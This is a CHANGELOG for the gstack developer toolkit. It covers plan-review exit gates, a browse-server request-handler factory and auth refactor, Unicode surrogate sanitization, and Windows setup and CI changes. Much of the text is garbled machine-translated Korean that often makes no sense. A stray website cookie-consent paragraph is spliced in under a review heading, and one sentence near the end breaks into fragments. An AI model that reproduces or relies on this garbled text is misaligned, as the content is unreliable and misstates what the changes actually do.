- `CONTRIBUTING.md` "Conductor workspaces" — `GSTACK_*` 접두사 주입 패턴, shim 파일 및 이미 가져 오기 4 항목 포인트를 문서화 한 새로운 단락.

#### 기여자

- 새로운 TS Anthropic 또는 OpenAI APIs (paid evals, `claude-agent-sdk`, gbrain embeddings, 모델 벤치 마크)를 붙드는 항목 포인트는 `import "../lib/conductor-env-shim";`를 첫 수입으로 추가해야 합니다. 그것 없이, 입구 포인트는 웨이퍼 포탄에서 작동하더라도 지휘자 안쪽에 끊겨집니다. `CONTRIBUTING.md`의 "Conductor workspaces" 구획에 있는 contributor checklist는 4개의 입장 철사를 위로 지명합니다.

## [1.39.1.0] - 2026-05-15

## **Plan-mode 후기는 이제 ExitPlanMode 게이트를 차단합니다.** ## **리뷰 보고서는 no 더 긴 계약의 끊기 없이 누락 될 수 있습니다.**

`/plan-eng-review`, `/plan-ceo-review`, `/plan-design-review`, `/plan-devex-review`, and `/codex review` now end with an EXIT PLAN MODE GATE (BLOCKING) section. Before calling ExitPlanMode, the model runs a four-item checklist: read the plan file, confirm the last `## ` heading is `## GSTACK REVIEW REPORT`, verify the report has a Runs/Status/Findings table + VERDICT line, and confirm `gstack-review-log` + `gstack-review-read` ran. 체크리스트 및 종료 계획 모드를 취소하면 계약 위반으로 프레임됩니다. 구조적 속성 ("리뷰 보고서는 파일 터미널 헤드링"입니다)는 "나는 계획 몸으로 프로세싱 된 일부 리뷰가 쓴 것입니다"라고 문 면역을 만드는 것입니다. `test/gen-skill-docs.test.ts` 스트립 담 코드 블록에 대한 회귀 테스트는 게이트가 터미널 `## ` 모든 4 계획 * "파일"에 헤드링됩니다.

### 중요 한 숫자

출처: `bun test test/gen-skill-docs.test.ts` — 389개의 케이스, ~1.5s의 모든 녹색. `awk`를 통해 수동 검증은 문이 LAST `## ` 각 계획* 검토 기술을 위해 재생된 SKILL.md에서 머리말을 이고, 코엑스의 단계 2A에 있는 중간 파일 (디자인 당 검토 형태를 알아내어).

| Surface | 의 전 | 후지후 |
|---|---|---|
| ExitPlanMode 의 계획-* 리뷰 | 소프트 `## Plan Status Footer`는 TOP의 기술에 미리 침입 : "계획 파일이 `## GSTACK REVIEW REPORT`를 부족한 경우 `gstack-review-read`를 실행하고 부록 ... PLAN MODE EXCEPTION - 항상 허용됩니다." 권한 부여, 사전 조건이 아닙니다. 스토 ~3000 라인 위의 ExitPlanMode 기술 프롬프트. | 터미널 `## EXIT PLAN MODE GATE (BLOCKING)`는 각 플랜* 검토 기술 EOF에 주입했습니다: 4 층은 실패 모드를 위해 명시된 "contract 위반"을 가진 각자 체크를 갖습니다. 마지막 모델은 ExitPlanMode의 앞에 읽습니다. |
| 조작 기술에 있는 전직 발걸이 (`/ship`, `/qa`, `/review`, `/health`) | 계획 모드 기술로 동일한 시행 텍스트 - 리뷰 - 자원 규칙은 no 검토 보고서가 있는 기술로 빚어 냈습니다 | 중립적 인 기대 참고 : "플랜뷰티 기술은 끝에서 EXIT PLAN MODE GATE를 포함합니다; 이 발기는 조작 능력을 위한 노 op입니다." No 부과된 규칙은 적용할 수 없습니다. |
| Regression 보호 | None - 문 배치는 어떤 미래 템플렛 편집에 침묵적으로 regress 할 수 있었습니다 | `bun test test/gen-skill-docs.test.ts` asserts gate는 4개의 계획* 기술 ( 담 코드 구획 줄무늬에)에서 머리에 놓는 맨끝 `## `이고 `toContain`를 통해 코덱에서 선물합니다. |

Codex (`/codex` 컨설팅 모드)에 의해 크로스 모델 검토는 6 개의 사전 - 수사 사실적인 문제 eng 검토 놓은: 삽입 선 번호는 끝 위치가 아니었습니다, 시험 regex는 담합 코드 구획 안쪽에 거짓 박격 `## ` 선, 시험 파일에서 일정한 기존 `REVIEW_SKILLS`는 가동 기술로 `plan-devex-review`, preamble retoning bled 검토 항구 규칙, 문 체크 4 충돌 `PLAN_FILE_REVIEW_REPORT`의 "skip가 침묵적으로 no 계획 파일" 탈출 절이, 그리고 실시 순서는 비스듬한 6개의 접점에서 비스듬히 막힌 것을 막기 위하여 충분히 명시되지 않았습니다.

### 계획 리뷰에 대한 의미

이 웹 사이트는 귀하가 웹 사이트를 탐색하는 동안 귀하의 경험을 향상시키기 위해 쿠키를 사용합니다. 이 쿠키들 중에서 필요에 따라 분류 된 쿠키는 웹 사이트의 기본적인 기능을 수행하는 데 필수적이므로 브라우저에 저장됩니다. 또한이 웹 사이트의 사용 방식을 분석하고 이해하는 데 도움이되는 제 3 자 쿠키를 사용합니다. 이 쿠키는 귀하의 동의하에 만 브라우저에 저장됩니다. 이러한 쿠키를 거부 할 수도 있습니다. 이러한 쿠키 중 일부를 선택 해제하면 검색 환경에 영향을 미칠 수 있습니다.

### 항목화 된 변경

#### 추가

- `generateExitPlanModeGate` `scripts/resolvers/review.ts:161`의 결실은, 4개의 층 차단 체크리스트를 "contract violation" framing로 방출합니다. 문 텍스트를 위한 진실의 단 하나 근원.
- `EXIT_PLAN_MODE_GATE` 위주자는 `scripts/resolvers/index.ts:42`에 등록했습니다. EOF `plan-eng-review/SKILL.md.tmpl`, `plan-ceo-review/SKILL.md.tmpl`, `plan-design-review/SKILL.md.tmpl`, `plan-devex-review/SKILL.md.tmpl`의 `codex/SKILL.md.tmpl`에 찬성해. 단계 2A (디자인에 의하여 중간 파일 - 단계 2B/2C는 계획 접촉 형태가 아닙니다)에 있는 `{{PLAN_FILE_REVIEW_REPORT}}` 후에 `codex/SKILL.md.tmpl`로 삽입했습니다.
- `test/gen-skill-docs.test.ts:3097` — 새로운 `EXIT PLAN MODE GATE placement`는 구획을 설명합니다. 일치하기 전에 지구에 의하여 담긴 코드 구획 `## ` 두드리기 (나브 regex는 `## GSTACK REVIEW REPORT` 보기 안쪽에 `PLAN_FILE_REVIEW_REPORT`의 담에 의하여 담긴 감속 구획을 거짓하. 신선한 기술 명부를 이용하십시오 — 상류 `REVIEW_SKILLS` 일정한 3개의 입장만 있고 조용히 계획 devex-review를 놓을 것입니다.

#### 변경

- `scripts/resolvers/preamble/generate-completion-status.ts:82` — `## Plan Status Footer` retoned from enforcement language ("if the plan file lacks `## GSTACK REVIEW REPORT`, run `gstack-review-read`... PLAN MODE EXCEPTION — always allowed") to neutral forward reference ("plan-review skills include the EXIT PLAN MODE GATE at the end; this footer is a no-op for operational skills"). Avoids review-report rules bleeding into `/ship`, `/qa`, `/review`, `/health`, etc.
- `test/gen-skill-docs.test.ts:1093` — 새로운 중립적인 낱말과 일치하기 위하여 기존하는 “계획 상태 발적” assertion에 새롭게 한. 지금 또한 “NO REVIEWS YET”의 부재를 주장합니다 불균형 재산에 잠그기 위하여.
- `test/fixtures/golden/{claude,codex,factory}-ship-SKILL.md` — 새로운 전술을 붙잡기 위하여 새롭게 한 황금 기본 선. 배 기술 몸은 바꾸지 않았습니다; 상속한 전술사만.

#### 고정

- `package.json` 빌드 스크립트 — 세 `{ git rev-parse HEAD 2>/dev/null || true; }` 버팀대 그룹 (Bun-Windows-hostile)는 v1.38.0.0 merge 해상도 동안 회귀; V1.38.0.0 invariant와 일치하기 위하여 `( ... )` subshells로 대체했습니다. Windows CI의 `build-script-shell-compat` 테스트 PR #1512에 의해 붙잡았습니다.

#### 기여자

- 구현 순서는 로드 베어링입니다: 해결자 → 인덱스 → 템플릿 → preamble → `bun run gen:skill-docs` → 테스트. 재생이 누락된 게이트에 실패하기 전에 테스트 추가; 해결자 편집 전에 재생은 no-op 출력을 생산합니다. Bisectable 커밋은이 순서를 존중해야 합니다.
- 코덱 게이트는 의도적으로 NOT 터미널 `codex/SKILL.md`입니다. Codex에는 세 개의 모드가 있습니다 (review/challenge/consult) 및 유일한 검토 모드는 파일을 계획하는 것을 씁니다. 게이트의 체크-2 ("마지막 두드리는 것은 GSTACK REVIEW REPORT")가 부족하게 때 no 계획 파일이 컨텍스트에 있을 때, 그래서 비 계획 코엑스 주장은 비 컴파일되지 않습니다.

## [1.39.0.0] - 2026-05-14

## **`buildFetchHandler` 배. Embedders는 위쪽에 오버레이 노선을 퇴비합니다.** ## **gstack는 검색 서버를 사용하지 않고 파견합니다.**

The browse daemon's request handler is now exposed as a factory. Embedders pass a `ServerConfig` with their own `authToken`, `browserManager`, and an optional `beforeRoute` hook, and gstack returns a `ServerHandle` with `fetchLocal`, `fetchTunnel`, `shutdown`, and `stopListeners`. The CLI path delegates to the same factory, so externally-observable behavior is unchanged. Auth state is now cfg-driven end-to-end: the module-level `AUTH_TOKEN` constant, its `initRegistry` boot call, the module `validateAuth`, and the module `shutdown` are deleted, and the factory closure owns those responsibilities so the embedder's browser is the one that actually closes on shutdown. The `beforeRoute` hook fires after the tunnel surface filter and before per-route dispatch. Returning a `Response` short-circuits gstack; returning `null` falls through to the gstack route. 잘못된 Bearer는 후크 (JDoc에서 새로운 보안 경고)에서 `null`로 해결하므로 자신의 신뢰 신호에 오버레이 코드 게이트가 다시 단순화 된 Bearer auth보다는 더 이상 해결합니다.

### 중요 한 숫자

소스: `bun test browse/test/server-factory.test.ts` — 28개의 테스트는 유형 표면 (14 사전 제작)과 새로운 공장 계약 (14 추가), 344 ms의 모든 녹색을 덮습니다. 또한 49개의 토큰 보유 테스트, 8개의 브라우저 skills-e2e 테스트, 29개의 브라우저 skill-commands 테스트, 15개의 기술이 테스트 — 새로운 idempotency 가드 패스의 밑에 `initRegistry`를 사용하는 각 시험. 새로운 시험 회귀는 주요 스위트의 나머지 부분에서 움직입니다.

| Surface | 의 전 | 후지후 |
|---|---|---|
| `buildFetchHandler(cfg: ServerConfig): ServerHandle` | 유형 전용; 수출하지 않는 공장 던짐 | CLI + gbrowser submodule에 사용 된 라이브 공장 |
| `beforeRoute` 오버레이 후크 | v1.34.0.0 이후 `ServerConfig`에서 선언, 결코 타전하지 | 터널 필터와 per-route 파견 전에 실행; `Response`에 단락, `null`에 따라 가을 |
| 단위 수준 `AUTH_TOKEN` const | `sanitizeAuthToken(process.env.AUTH_TOKEN) ?? randomUUID()` 수입 시간에 구워, 7+ 전화 사이트로 읽으십시오 | 삭제; cfg.authToken은 진실의 단일 소스, `launchHeaded`를 통해 스레드, 국가 파일 쓰기, 그리고 하나의 패스에 공장 |
| 단위 수준 `validateAuth` | 모듈 `AUTH_TOKEN`를 읽으십시오 | deleted; factory-scoped closure reads `cfg.authToken` |
| 단위 수준 `shutdown` | 모듈 레벨 `browserManager` (phoenix에 대한 잘못된) | 삭제; 공장경도 `shutdown` 닫기 `cfg.browserManager` |
| `initRegistry` | `rootToken`를 unconditionally 덮어쓰기 | token와 같은데미포런트; 다른 token (부동에 부착된 misconfiguration)를 위해 명확하게 던졌습니다 |
| `__resetRegistry()` 테스트 돕기 | 존재하지 않는다 | 거울 `__resetConnectRateLimit`; 새로운 감시를 여행하지 않고 깨끗한 레지스트리로 시험 시작하십시오 |
| 순수한 diff | — | ~500 LOC 이동 + 14 새로운 계약 테스트 + 1 idempotency 감시 + 1 걸이 배선 + 4 시험 파일 사용 `__resetRegistry` |

공장은 v1.34.0.0가 문서화되었지만 자체에 수정할 수 없습니다.

### 이 embedders에 대한 의미

gbrowser v0.6.0.0 (phoenix 오버레이)는 이제 배를 할 수 있습니다. 피닉스는 `buildFetchHandler`를 직접 수입하고, 그 자체 `BrowserManager`와 오버레이 후크를 통과하고, 동일한 gstack 파견은 각 명령을 운반합니다. No 포크, no 중복 경로, no는 `process.env.AUTH_TOKEN`를 놓기 전에 설치해야 합니다. CLI의 경우 변경 사항이 없습니다.

### 항목화 된 변경

#### 추가

- `buildFetchHandler(cfg: ServerConfig): ServerHandle` `browse/src/server.ts`.
- `beforeRoute` 오버레이 저자를 위한 안전 경고 JSDoc와 더불어 요구 핸들러에 있는 걸이 배선.
- `browse/test/server-factory.test.ts` (covers ServerHandle 모양, auth 배선, 검증 던지기, 두 표면 모두에 걸쳐 후크 semantics, 및 레지스트리 idempotency / mismatch-throw)에 14 공장 계약 테스트.
- `__resetRegistry()` `browse/src/token-registry.ts` (mirrors `__resetConnectRateLimit`)에 있는 시험 전용 수출.
- Module-level `activeShutdown` ref 그래서 공장경화 폐쇄를 통해 모듈 수준의 타이머 및 신호 핸들러 노선.

#### 변경
- `start()`는 `buildFetchHandler`에 핸들러 건축을 위임합니다. `resolveConfigFromEnv()`를 통해 한 번 env를 읽고 `authToken`로 `launchHeaded`, 국가 파일 쓰기 및 공장에 그 결과로 실을 읽으십시오.
- Auth는 이제 cfg 구동 엔드 엔드입니다. 모듈 레벨 `AUTH_TOKEN` const, `initRegistry(AUTH_TOKEN)` 부팅 호출, `validateAuth`, `shutdown`는 삭제됩니다; 공장 폐쇄는 그들을 소유합니다.
- `initRegistry`는 동일한 토큰 재입고를 위해 불문합니다; `buildFetchHandler`에 embedders를 가진 다른 토큰 재입고를 위해 명확하게 던집니다.
- Bun.serve 반환 값 (`server`)은 `start()` (Codex 외부 청구서 #8)에서 붙잡습니다.
- `ServerConfig.beforeRoute` JSDoc은 재검사 없이 걸이에서 특권을 받은 자료에 관하여 정직한과 안전 경고를 위해 새롭게 했습니다.

#### 기여자
- Lifecycle 싱글턴 (`LOCAL_LISTEN_PORT`, `tunnelActive`, 검수원 국가, `isShuttingDown`)는 모듈 범위에 의도적으로 체재합니다; auth 국가는 아닙니다. 다 손잡이 고립은 후속 TODO로 붙잡습니다.
- `rotateRoot() → initRegistry('fixed-token')` `__resetRegistry() → initRegistry('fixed-token')`를 뒤로 낸 시험은 이렇게 새로운 mismatch 감시가 불을 끄지 않습니다.
- `dual-listener.test.ts` 및 `server-auth.test.ts`의 소스 단락 테스트는 새로운 식별자 (`handle.fetchLocal`/`handle.fetchTunnel`, `authToken`, `shutdownFn`)와 일치하도록 업데이트되었습니다.

## [1.38.1.0] - 2026-05-14

## **모든 리뷰 기술은 빌드 액션 가능한 작업 체크리스트로 끝납니다. 연맹 동기화는 사무실 시간 디자인 docs를 삭제합니다. Surrogate 위생은 v1.38.0.0의 초크 포인트의 상단에 방어 심층을 가져옵니다.** ## **두 개의 커뮤니티 파일 문제 토지 한 파로 : JSONL의 구현 작업 `/autoplan`, `.brain-allowlist`의 루트 레벨 아트ifact 패턴을 가진 per-skillation Task. 테스트 가능한 `buildCommandResponse` 추출 및 JSON-escape sanitizer at top of v1.38.0.0's `handleCommandInternal` #1440에 대한 choke-point 수정.**

v1.38.0.0 (단일 배송)는 `handleCommandInternal` 내부 건축 초크 점에서 surrogate 위생을 뒀습니다. 모든 명령 결과는 이제 모든 콜러 (HTTP, `/batch`, 범위 - 투켄 파견)가 그것을 참조하십시오. 이 릴리스는 방어 심층층을 추가합니다. `buildCommandResponse`는 `handleCommand`에서 수출한 순수한 기능으로 추출됩니다, 그래서 HTTP 책임은 자주적으로 단 하나 시험되고, `stripLoneSurrogateEscapes`는 손잡이 `\uXXXX` JSON 시동 순서에 있는 시동을, 끄는 경우에 있는 시동을, 끄는 순서가 이미 JSON-stringified 이고, `stripLoneSurrogateEscapes`는, 스코크 포인트 붙잡습니다 결과 건축 시간, 그 외침을 통해서 아무런 텍스트도 묶는 것을 통해.

모든 4개의 검토 기술 (CEO / 디자인 / eng / DX)는 이제 `## Implementation Tasks` Markdown checklist로 끝나고 `jq`-built JSONL artifact로 `~/.gstack/projects/$SLUG/tasks-{phase}-{datetime}.jsonl`를 쓰십시오. `/autoplan`의 단계 4는 현재 branch + 5컴스트 창에 의하여, dedupes에 의하여 모든 4개의 파일을, 읽습니다 정확한 `(component, sorted(files), title)` 경기에, 그리고 1개의 집계된 응집한 목록에서 동일한 문에서 동일한 문에서 동일한 문에서 옵니다; 다른 타이틀 표면과 동일한 파일을 만질 수 있도록, 인간은 동일한 작업을 결정할 수 있습니다. 독립 검토는 실행 (`/plan-eng-review` 혼자, 등) 자신의 작업 목록을 생성하고 JSONL 외부 Autoplan - JSONL는 handoff 계약입니다.

연맹 동기화 (`gstack-brain-sync`)는 조용히 루트 수준의 디자인과 테스트 계획 docs를 건너 갔다 - `/office-hours`와 `/plan-eng-review`는 `projects/{slug}/{user}-{branch}-design-*.md`에 쓰고, 그러나 allowlist는 `projects/*/designs/*.md`와 `projects/*/ceo-plans/*.md`에 관하여만 알고 있었습니다. `.brain-allowlist`, `.brain-privacy-map.json` (`artifact`로 분류해, 그리고 `.gitattributes` (`merge=union`에 손잡이 교차 기계에 `.brain-allowlist`에). idempotent jq 기반 마이그레이션 (`gstack-upgrade/migrations/v1.38.1.0.sh`) 패치는 기존의 설치를 다시 실행하지 않고 `gstack-artifacts-init` (git commit + push 및 clobbered user state를 수행 할 것).

### 중요 한 숫자

출처: `bun test browse/test/sanitize.test.ts browse/test/build-command-response.test.ts test/artifacts-init-migration.test.ts` — 32개의 새로운 단위 시험은 각 고침 표면을, 모든 녹색 덮습니다.

| Surface | 의 전 | 후지후 |
|---|---|---|
| API 400 `$B text` 에서 surrogate-containing 페이지 | 퀵메뉴 | 추출 + chokepoint에 산화 |
| API 400 `$B html`, `$B accessibility`, `$B batch`에서 | 충돌 (초크 포인트 우회) | `buildCommandResponse` + `/batch` 봉투에 산정 |
| Application/json체를 `\uXXXX` 탈출 | 아직도 추락 (regex 일치 원시 코드 포인트 만) | Second-pass `stripLoneSurrogateEscapes`는 탈출 텍스트를 취급합니다. |
| `/autoplan` 최종 출력 | 결정 요약, no 작업 목록 | 결정 요약 **을 읽는다** 모든 4 단계에서 `Implementation Tasks` |
| 독립 `/plan-eng-review` 산출 | 필수 출력 섹션, no 작업 목록 | Same **을 읽는다** per-skill `Implementation Tasks` + JSONL handoff |
| `/office-hours` federation 큐에 있는 디자인 문서 | 자동적으로 건너 뛰기 (allowlist에서 루트 수준 아닙니다) | , 분류된 `artifact`, 적용되는 조합 merge 규칙 |
| Lone surrogate 위생기 perf 에 1MB 깨끗한 텍스트 | n/a | <500ms (단일 regex 통행) |
| `buildCommandResponse` 테스트 가능 | 내부에 끼워넣어 `handleCommand`, 수출하지 않는 | 추출, 수출, 7 단위 테스트 커버 |

### 이 빌더를 위한 뜻

Page captures with mixed-script Unicode round-trip cleanly to the Claude API now. Every review skill you run ends with a checkbox list of build tasks you can hand to Claude Code or Codex. Federation sync picks up the design docs that were silently dropping out of your brain repo. Run `/gstack-upgrade` to pick up the migration that patches your `.brain-allowlist`, `.brain-privacy-map.json`, and `.gitattributes` in place; no commit + push, no user-state clobber.

### 항목화 된 변경

#### 고정

- **v1.38.0.0의 항복률(#1440)의 최고에 대한 깊이에 대한 방어** — v1.38.0.0 sanitizes at `handleCommandInternal` (the choke point all callers go through). This release adds a second layer at the HTTP-response boundary: `browse/src/sanitize.ts` (new) exports `stripLoneSurrogates`, `stripLoneSurrogateEscapes` (handles `\uXXXX` JSON-escape variants the raw-codepoint regex misses), and `sanitizeBody` (picks the right pass for text/plain vs application/json). `buildCommandResponse`는 `handleCommand`에서 추출되고 그래서 응답 경계선은 서버의 회전 없이 단 하나 시험 가능합니다. `/batch`는 또한 벨트와 sosuspenders로 per-result + envelope sanitize를 가져옵니다. `getCleanText`, `getCleanTextWithStripping`, `html`, `accessibility`, 그리고 `snapshot` 적출 위치 때문에 국소를 아래로 맵니다 (자본을, 감싸는 원본을 더 청결한 봅니다).
- **연맹 동기화 방울 `/office-hours` 및 `/plan-eng-review` artifacts (#1452)** — `bin/gstack-artifacts-init`는 `projects/*/*-design-*.md`와 `projects/*/*-test-plan-*.md`를 3개의 관리 구획에 추가합니다: `.brain-allowlist`, `.brain-privacy-map.json` (종류 `artifact`), `.gitattributes` (`merge=union`).
- **`/setup-gbrain` 잘못된 설정 키 (#1441)** — v1.27.0.0에서 이미 수정된 확인; 레거시 `gbrain_sync_mode`를 정렬하는 마이그레이션 스크립트를 인용하는 주석으로 문제점을 현재 `artifacts_sync_mode` 키로 설치합니다.

#### 추가

- **`## Implementation Tasks` 섹션 + JSONL 각 리뷰 기술에 손전등 (#1454)** — `plan-ceo-review`, `plan-design-review`, `plan-eng-review`, `plan-devex-review`는 각각 per-skilldown marklist를 방출하고 `~/.gstack/projects/$SLUG/tasks-{phase}-{datetime}.jsonl`를 통해 `jq -nc` (never hand-rolled echo) 씁니다. `/autoplan` 단계 4는 현재 branch 및 5조 창에 의하여 4 단계 JSONL 파일, 범위, 정확한 `(component, sorted(files), title)` 경기에 dedupes, 1개의 표를 읽었습니다. 외부 표면은 인간적인 해상도를 위한 가능한 중복 노트와 별도로.
- **`browse/src/sanitize.ts`** — 2개의 surrogate-stripping 유틸리티 플러스 내용 유형에 열쇠가 되는 편익 선별기. `server.ts`에서 재공장을 가진 쌍은 `/batch` 핸들러에 있는 과잉 위생 및 per-result 만족을 위해 (시험성) `/batch`.
- **`gstack-upgrade/migrations/v1.38.1.0.sh`** - `.brain-allowlist`, `.brain-privacy-map.json`, `.gitattributes`를 위한 idempotent per-file 수선. `jq`를 위해 JSON 파일을 위해 `jq`가 누락되는 경우에 명확한 경고로 뒤떨어졌습니다. NOT 재뛰기 `gstack-artifacts-init` (commit + push가 사용자의 federated repo에 `gstack-artifacts-init`일 것입니다) `gstack-artifacts-init` (.
- **32개의 새로운 단위 시험** `browse/test/sanitize.test.ts` (18), `browse/test/build-command-response.test.ts` (7), `test/artifacts-init-migration.test.ts` (7). 모든 문 층 (무료, 각 PR에 실행하십시오).

#### 변경

- **`browse/src/snapshot.ts`, `read-commands.ts`, `content-security.ts`** - 전반 소비자 (데이터마크링, 봉투 포장)를 공급하는 추출 사이트에서 방어적인 심층적 인 대가 포장.
- **`scripts/resolvers/tasks-section.ts`** (new) + **`scripts/task-emission-schema.ts`** (new) — shared resolver and schema for the per-skill task emission. Each review template invokes `{{TASKS_SECTION_EMIT:<phase>}}` once.

#### 기여자

- `/codex review` 에 Codex CLI ≥0.130.0는 v1.34.2.0 (이중 방향 bare/exec 접근법)에 의해 따로따로 취급되었습니다. 우리의 계획은 인접한 관심사를 표면 처리했습니다: bare 경로 no 더 긴 파일 시스템 경계를 나르기 위하여, 그래서 코덱은 diff가 `.claude/skills/`를 접촉하기 위하여 일어나는 때 토큰 독서 기술 파일을 낭비할지도 모릅니다. 후속 문제점으로 신청하는; 이 방출을 막지 마십시오.
- `/autoplan`의 구현 시크로니컬은 반복적인 마진보다 단계 사이에 구조화된 JSONL 핸오프를 사용합니다. Schema는 `scripts/task-emission-schema.ts`에서 생명을 구합니다. 다섯 번째 검토 단계가 `scripts/resolvers/tasks-section.ts`에서 `VALID_PHASES`로 단계 이름을 추가하고, 새로운 검토 템플릿에서 `{{TASKS_SECTION_EMIT:<phase-name>}}`를 포함하여 `{{TASKS_SECTION_EMIT:<phase-name>}}`를 포함합니다.
- Touchfiles 항목은 변경되지 않습니다. 새로운 테스트는 `bun test`에서 실행되는 모든 게이트 계층 단위 테스트입니다. Touchfiles는 E2E + LLM evals에서만 사용됩니다.

## [1.38.0.0] - 2026-05-14

## **Windows는 각 호스트 어댑터를 통해 실제로 작동한다. 페이지는 모든 egress 경로에 lone Unicode surrogates를 생존.** ## **Forty-two `ln -snf` call sites in `setup` now route through one helper that picks `cp -R` / `cp -f` on MSYS2/Git Bash. The browse server sanitizes lone surrogates at the architectural choke point so HTTP, batch, and both SSE streams inherit it. The Windows free-test CI lane moves to a paid faster runner.**

Windows users who pull `git pull && ./setup` now get fresh skill files for every host adapter (Claude, Codex, Factory, OpenCode, Kiro) — not just the top-level Claude SKILL.md. The previous behavior was silent staleness: `ln -snf` on Windows-without-Developer-Mode produces a frozen file copy that doesn't refresh on subsequent runs. A new `_link_or_copy` helper in `setup` dispatches on `IS_WINDOWS` and picks the right primitive (`cp -R` for directories, `cp -f` for files, `ln -snf` otherwise). 모든 42 symlink 사이트 경로를 통해. 정적 변수 테스트는 0 원시 `ln` 을 호출하여 도움말 체외에 호출하여 버그가 향후 기여를 통해 반환 할 수 없습니다.

검색 서버의 유니코드 위생 상승 `handleCommand` (PR #1463의 원래 대상)에서 `handleCommandInternal` 그래서 배치 명령 경로 (`/command/batch`)까지 상속합니다. SSE 프로듀서 ( `/activity/stream`와 검사기 스트림에 대한 행동 피드) 이제 `sanitizeReplacer` 함수를 사용하여 JSON.stringify — post-stringify regex가 유효하기 때문에 `JSON.stringify` 이미 `\uD800`를 탈출 순서 `"\\ud800"`로 변환했습니다. 결과: 서버에서 배가 혼자 있는 각 페이지 내용 탑재량 UTF-16 surrogate halves는 U+FFFD로 대체했습니다 어떤 다운스트림 소비자의 앞에 (Anthropic API, sidebar JSON.parse)는 그(것)들을 보십시오.

Linux CI 작업은 `ubicloud-standard-8`를 통합한 청구서 및 4x를 무료로 `ubuntu-latest`보다 더 많은 코어로 마이그레이션합니다. 8개의 워크플로우는 Linux 풀을 만드세요: `evals.yml`, `evals-periodic.yml`, `ci-image.yml`, `make-pdf-gate.yml`, `actionlint.yml`, `pr-title-sync.yml`, `skill-docs.yml`, `version-gate.yml`. Windows-only 작업 (`windows-free-tests.yml`)은 GitHub의 무료 `windows-latest`에 체재합니다 - Ubicloud는 Windows 수영장, GitHub의 급여 `windows-latest-8-cores`를 발송하지 않습니다 org 수준 더 큰 주자 계산 활성화를, 파 표지 시험 이 일은 작습니다 느린 4 핵심 자유로운 주자가 2 분의 밑에 총 노동 시간을 지킵니다. 4개의 새로운 파 시험은 등록됩니다: sanitizer 단위 + 버그 리프로 + 배선 invariants, 설정 돕기 정적 - invariant + 동작 매트릭스, 빌드 - script POSIX-shell sanity, 그리고 doc-vs-config deprecated-key drift 가드. 아직도 이름이 지정된 `gbrain_sync_mode` 구성 열쇠를 참조하고, drift 가드가 reintroduction을 방지합니다.

@realcarsonterry에 의해 기여: PRs #1460, #1461, #1462, 그리고 #1463는 이 파의 씨앗입니다. 모든 42 설정 사이트 + 모든 서버 egress 경로 + Windows CI 마이그레이션 범위 확장은 gstack 유지자의 후속입니다.

### 중요 한 숫자

출처: branch의 diff와 `origin/main`에 대한 `~/.claude/plans/system-instruction-you-are-working-peppy-volcano.md` (target ship slot v1.38.0.0 후 큐 사전을 과거에 flight PR #1500).

| Surface | 의 전 | 후지후 | Δ |
|---------|--------|-------|---|
| `setup` symlink 사이트 Windows에 대 한 보호 | 0 의 42 | 42 의 42 | +42 |
| 서버 Unicode-sanitization egress 포인트 | 0 | 4 (HTTP, 배치, 활동 SSE, 검사기 SSE) | +4 |
| Bash `package.json` 빌드 스크립트 (Bun-Windows-hostile) | 3 | 0 | -3 |
| docs의 `gbrain_sync_mode` 참조 | 5 | 0 | -5 |
| 새로운 회귀 시험 | 0 | 29 (4 파일) | +29 |
| Linux CI 주자 풀 | `ubuntu-latest` (4개의 핵심, 자유로운) + `ubicloud-standard-2`의 혼합 | `ubicloud-standard-8` 모든 것 | Linux를 위한 단 하나 청구 표면, 4x는 이전에 자유로운 일에 핵심을 더 많은 것 |
| Windows CI 주자 | `windows-latest` (무료) | `windows-latest` (무료, 변경되지 않음) | Ubicloud는 Windows를 제공하지 않습니다; 지불된 GitHub 더 큰 주자 선택권은 현재 놓지 않는 org-billing toggle를 요구합니다 |

정적 인 변수 테스트 (D7)은 `setup`를 읽고 `ln`는 `_link_or_copy` 헬퍼 바디 바깥으로 호출합니다. 미래의 기여자가 빌드를 실패한 단일 한 줄 슬립조차도.

### 다운스트림 gstack 사용자를 위한 이 수단은

Windows: `./setup`에서 gstack를 실행하면, 이제 각 호스트 어댑터를 통해 작업 설치를 생성하고, 사용자 접근 가능한 메모는 `git pull` 후 다시 실행하도록 알려줍니다. 비 라틴 텍스트 또는 이모티콘으로 페이지를 긁으면 Bun의 CDP 응답은 no가 더 이상 Anthropic API를 끊을 수 있습니다. JSON는 각 호스트 어댑터에 의해 실행되고, e-str.m.에 의해 e-str.n-str.net/>는 각 서버가 e-str. a future `ln -snf` slip in `setup` will fail CI, and a future SSE endpoint that bypasses sanitization is flagged by an inline invariant comment plus this CHANGELOG entry.

### 항목화 된 변경

#### 추가

- **`browse/test/server-sanitize-surrogates.test.ts`** - 11개의 단위 케이스 (수신, 유효한 쌍, 혼자 높은/low 중간 끈, trailing/leading 혼자, 인접한 두 배, 쌍 그 후에 혼자, 혼자서 쌍), 2개의 버그 리프로 시험 (UTF-8 둥근 지구 + JSON 둥근 지구), 3개의 배선 invariant 시험 (handleCommandInternalImpl 이름, SSE 활동, SSE 활동, 검사합니다.
- **`test/setup-windows-fallback.test.ts`** - 정적 invariant (zero raw `ln` 외침 도움자), 돕기 연장 assertions, 행동 매트릭스 (4 셀: file/dir × Windows/Unix) 을 통해 awk-style 돕er 추출 + `bash -c` sourcing, Windows-note 프린터 등록 검사.
- **`test/build-script-shell-compat.test.ts`** — `package.json scripts.*`에 대하여 regex는 bash brace 그룹을 거부합니다 (Bun-Windows-hostile); asserts `.version`는 놋쇠를 사용하지 않는 서브쉘을 리디렉션합니다.
- **`test/docs-config-keys.test.ts`** - `docs/**/*.md`를 통해 스캔 한 `docs/**/*.md` (`gbrain_sync_mode`, `gbrain_sync_mode_prompted`) `docs/**/*.md`; `gstack-config get artifacts_sync_mode`를 위한 둥근 지구 시험.

#### 변경

- **`browse/src/server.ts`** — `handleCommandInternal`는 `handleCommandInternalImpl` (raw) + 얇은 위생 래퍼로 나누었습니다. HTTP와 배치 소비자 둘 다를 위한 단일 진입 점. 래퍼 문서의 가까이에 인라인 INVARIANT 의견은 건축 제약을 문서에 기입합니다.
- **`browse/src/server.ts` SSE 프로듀서** - 활동 피드 (`/activity/stream`) 및 검수원 스트림은 `sanitizeReplacer`, 인코딩 중 각 문자열 값을 청소하는 `JSON.stringify` replacer 함수를 문자열로 지정합니다. 포스트-stringify regex는 `JSON.stringify`가 이미 `\uD800`를 `"\\ud800"`로 변환했기 때문에 INVARIANT는 각각에 주석을 붙여 넣을 수 있습니다.
